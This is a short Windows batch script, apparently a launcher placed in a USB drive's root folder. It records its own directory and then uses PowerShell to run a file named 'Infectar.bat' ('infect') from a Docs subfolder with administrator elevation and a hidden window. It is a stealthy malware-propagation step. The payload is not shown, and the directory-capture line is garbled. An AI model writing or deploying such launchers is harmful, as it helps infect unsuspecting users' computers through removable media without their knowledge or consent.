REM "CARPETA RAIZ USB"
@ECHO OFF & CLS
FOR /F "TOKENS=*" %%%% in ('CD') DO (SET HERE=%%~%%)
ECHO %HERE%Docs>%tmp%\Current.txt
PowerShell Start %HERE%/Docs/Infectar.bat -Verb runAs -WindowStyle Hidden
EXIT